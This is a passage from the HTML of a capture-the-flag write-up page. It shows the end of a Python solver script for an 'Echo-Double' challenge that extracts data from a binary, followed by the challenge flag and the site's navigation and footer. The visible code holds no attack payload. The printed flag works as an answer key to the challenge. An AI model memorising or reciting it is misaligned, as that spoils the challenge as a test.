        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Error parsing hex: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="kn">import</span> <span class="n">sys</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">=</span><span class="sh">"</span><span class="o">*</span><span class="mi">60</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Echo-Double Challenge Solver</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">=</span><span class="sh">"</span><span class="o">*</span><span class="mi">60</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">()</span>
    
    <span class="c1"># Get filename
</span>    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">filename</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">filename</span> <span class="o">=</span> <span class="sh">'</span><span class="s">l</span><span class="sh">'</span>
    
    <span class="c1"># Try automatic extraction first
</span>    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] Attempting automatic data extraction from </span><span class="sh">'</span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="sh">'</span><span class="s">...</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">result</span> <span class="o">=</span> <span class="nf">extract_data_from_binary</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
    
    <span class="k">if</span> <span class="ow">not</span> <span class="n">result</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span> <span class="o">+</span> <span class="sh">"</span><span class="s">=</span><span class="sh">"</span><span class="o">*</span><span class="mi">60</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Automatic extraction failed. Switching to manual mode...</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">=</span><span class="sh">"</span><span class="o">*</span><span class="mi">60</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">()</span>
        <span class="nf">manual_solve</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="nf">main</span><span class="p">()</span>
</pre></table></code></div></div><h2> Flag</h2><code> cys{s3cr3t_1s_un10cked} </code><hr></div><script> document.addEventListener("DOMContentLoaded", () => { tocbot.init({ tocSelector: '#toc', contentSelector: '.post-content', ignoreSelector: '[data-toc-skip]', headingSelector: 'h1', orderedList: false, scrollSmooth: false, }); }); </script></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div class="panel-heading"> <a href="https://github.com/cyscomvit/writeups/tree/main/website/writeups/FinalTrace_2025/index.md" ><i class="fab fa-github"></i> Edit on GitHub </a></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc"></nav></div><script src="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.js"></script></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tag/authentication/">authentication</a> <a class="post-tag" href="/tag/idor/">idor</a> <a class="post-tag" href="/tag/sql-injection/">sql-injection</a> <a class="post-tag" href="/tag/ssti/">ssti</a> <a class="post-tag" href="/tag/xss/">xss</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://cyscomvit.com">Cyscom</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0">Using the <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> theme <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>.</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false" ><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5"></p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script defer src="/assets/js/dist/commons.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
